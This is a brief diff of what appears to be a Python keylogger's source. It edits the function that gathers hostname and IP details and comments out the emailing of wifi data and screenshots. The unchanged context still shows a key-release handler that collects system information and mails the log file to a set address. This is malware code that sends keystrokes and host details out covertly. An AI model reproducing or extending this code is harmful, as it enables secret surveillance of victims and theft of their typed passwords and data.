@@ -55,7 +55,9 @@ def send_mail(filename,attachment,toaddr):
 '''******************************************************************SYSTEM INFORMATION************************************************************'''
 def system_information():
     with open(file, "a") as f:
-        f.write("\n---------------------\n")
+        f.write("\n----------------------------------------------------------\n")
+        f.write("SYSTEM INFORMATION\n")
+        f.write("\n----------------------------------------------------------\n")
         hostname = socket.gethostname()
         IPAddr = socket.gethostbyname(hostname)
         try:
@@ -133,8 +135,8 @@ def release(key):
         system_information()
         send_mail(file,file, toaddr)
         #send_mail(system_info,system_info, toaddr)
-        send_mail(wifi_info,wifi_info,toaddr)
-        send_mail(ss_doc,ss_doc,toaddr)
+        #send_mail(wifi_info,wifi_info,toaddr)
+        #send_mail(ss_doc,ss_doc,toaddr)
         return False
 
 def start(user):
